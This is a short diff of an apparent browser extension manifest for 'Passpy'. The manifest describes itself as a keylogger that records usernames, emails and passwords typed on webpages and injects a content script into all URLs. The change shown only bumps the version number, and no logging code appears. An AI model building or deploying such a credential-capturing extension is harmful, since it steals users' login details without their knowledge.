@@ -3,7 +3,7 @@
   "name": "Passpy",
   "short_name": "passpy",
   "description": "Light weight key logger that logs usernames, emails and passwords (login credentials) used in webpages into client database",
-  "version": "0.0.0.2",
+  "version": "0.0.0.4",
   "content_scripts": [
     {
       "matches": ["<all_urls>"],
